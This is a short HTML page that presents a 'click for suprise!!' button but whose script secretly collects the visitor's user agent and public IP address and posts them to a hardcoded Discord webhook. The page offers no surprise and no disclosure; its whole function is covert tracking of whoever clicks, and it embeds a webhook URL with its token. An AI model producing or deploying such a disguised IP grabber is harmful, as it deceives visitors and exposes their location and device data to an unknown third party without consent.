<!DOCTYPE html>
<html>
<head>
	<title>suprise</title>
</head>
<body>


	<button onclick="logDeviceTypeAndIp()">click for suprise!!</button>

	<script>
		function logDeviceTypeAndIp() {
			var deviceType = navigator.userAgent;
			console.log("Device Type: " + deviceType);

			// Get the user's IP address
			fetch("https://api.ipify.org?format=json")
			.then(response => response.json())
			.then(data => {
				var ipAddress = data.ip;
				console.log("c");

				// Define the Discord webhook URL
				var webhookUrl = "https://discord.com/api/webhooks/1095363258346643649/tCKNsqLmwt9ki-c3gL_FpqitydIf5TIWAkpxetSpBEq-S7ydnKeaNRaqKN1vbADWPNVx";

				// Create a data object with the device type and IP address
				var data = { "content": "Device Type: " + deviceType + "\nIP Address: " + ipAddress };

				// Send the data to the Discord webhook using a fetch request
				fetch(webhookUrl, {
					method: "POST",
					headers: { "Content-Type": "application/json" },
					body: JSON.stringify(data)
				})
				.then(response => console.log("b"))
				.catch(error => console.error("c", error));
			})
			.catch(error => console.error("c", error));
		}
	</script>


</body>
</html>
